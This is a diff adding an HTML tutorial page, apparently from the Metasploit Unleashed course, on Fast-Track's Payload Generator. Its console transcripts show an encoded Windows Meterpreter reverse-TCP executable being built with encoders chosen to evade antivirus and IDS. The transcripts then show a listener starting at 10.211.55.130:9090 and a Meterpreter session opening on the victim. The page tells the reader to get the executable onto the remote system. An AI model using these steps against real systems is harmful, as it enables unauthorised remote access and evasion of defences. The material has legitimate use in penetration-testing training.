@@ -1,0 +1,42 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content="text/html; charset=ISO-8859-1"
+ http-equiv="Content-Type">
+  <title>Payload Generator</title>
+</head>
+<body>
+<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Payload
+Generator</h1>
+<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
+- Mastering The Framework</h3>
+<p style="color: rgb(0, 0, 0);">The Fast Track Payload Generator will
+create custom Metasploit
+Payloads for you with a click of a button. Often though, remembering
+the commands with msfpayload can be tricky but Fast-Track's Payload
+Generator simplifies it for you!
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">Fast-Track Main Menu:<br><br>        1.  Fast-Track Updates<br>        2.  Autopwn Automation<br>        3.  Nmap Scripting Engine<br>        4.  Microsoft SQL Tools<br>        5.  Mass Client-Side Attack<br>        6.  Exploits<br>        7.  Binary to Hex Payload Converter<br>        8.  Payload Generator<br>        9.  Fast-Track Tutorials<br>        10. Fast-Track Changelog<br>        11. Fast-Track Credits<br>        12. Exit Fast-Track<br><br>        Enter the number: 8<br><br><br>        The Metasploit Payload Generator is a simple tool to<br>        make it extremely easy to generate a payload and listener<br>        on the Metasploit framework. This does not actually<br>        exploit any systems, it will generate a metasploit payload<br>        for you and save it to an executable. You then need to<br>        someone get it on the remote server by yourself and get it<br>        to execute correctly.<br><br>        This will also encode your payload to get past most AV and<br>        IDS/IPS.<br><br>    What payload do you want to generate:<br><br>        Name:                                Description:<br><br>        1. Windows Shell Reverse_TCP         Spawn a command shell on victim and send back to attacker.<br>        2. Windows Reverse_TCP Meterpreter   Spawn a meterpreter shell on victim and send back to attacker.<br>        3. Windows Reverse_TCP VNC DLL       Spawn a VNC server on victim and send back to attacker.<br>        4. Windows Bind Shell                Execute payload and create an accepting port on remote system.<br><br>        -c to Cancel<br><br>        Enter choice (example 1-6): 2<br><br><br>        Below is a list of encodings to try and bypass AV.<br><br>        Select one of the below, Avoid_UTF8_tolower usually gets past them.<br><br>        1. avoid_utf8_tolower<br>        2. shikata_ga_nai<br>        3. alpha_mixed<br>        4. alpha_upper<br>        5. call4_dword_xor<br>        6. countdown<br>        7. fnstenv_mov<br>        8. jmp_call_additive<br>        9. nonalpha<br>        10. nonupper<br>        11. unicode_mixed<br>        12. unicode_upper<br>        13. alpha2<br>        14. No Encoding<br><br>        Enter your choice : 2<br><br>    Enter IP Address of the listener/attacker (reverse) or host/victim (bind shell): 10.211.55.130<br>    Enter the port of the Listener: 9090<br><br>    Do you want to create an EXE or Shellcode<br><br>        1. Executable<br>        2. Shellcode<br><br>        Enter your choice: 1<br>Created by msfpayload (http://www.metasploit.com).<br>Payload: windows/meterpreter/reverse_tcp<br> Length: 310<br>Options: LHOST=10.211.55.130,LPORT=9090,ENCODING=shikata_ga_nai<br><br><br>A payload has been created in this directory and is named 'payload.exe'. Enjoy!<br><br><br>Do you want to start a listener to receive the payload yes or no: yes<br><br>Launching Listener...<br>***********************************************************************************************<br><br>Launching MSFCLI on 'exploit/multi/handler' with PAYLOAD='windows/meterpreter/reverse_tcp'<br>Listening on IP: 10.211.55.130 on Local Port: 9090 Using encoding: ENCODING=shikata_ga_nai<br><br>***********************************************************************************************<br>[*] Please wait while we load the module tree...<br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Starting the payload handler...</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Notice that once the payload is
+created, Fast-Track can
+automatically set up a listener for you to accept the connection. Now
+all you have to do is get the executable on the remote system itself.
+Once executed:
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);">***********************************************************************************************<br><br>Launching MSFCLI on 'exploit/multi/handler' with PAYLOAD='windows/meterpreter/reverse_tcp'<br>Listening on IP: 10.211.55.130 on Local Port: 9090 Using encoding: ENCODING=shikata_ga_nai<br><br>***********************************************************************************************<br>[*] Please wait while we load the module tree...<br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Starting the payload handler...<br>[*] Transmitting intermediate stager for over-sized stage...(216 bytes)<br>[*] Sending stage (718336 bytes)<br>[*] Meterpreter session 1 opened (10.211.55.130:9090 -&gt; 10.211.55.128:1078)<br><br><u>meterpreter</u> &gt;</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">We just learned how to easily create
+payloads using the Fast-Track
+framework and ultimately gain access to a system using a custom-created
+payload through the Metasploit Framework!
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<div style="text-align: center; color: rgb(0, 0, 0);"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/Fast-Track"
+ title="Fast-Track">Fast-Track</a></div>
+</body>
+</html>
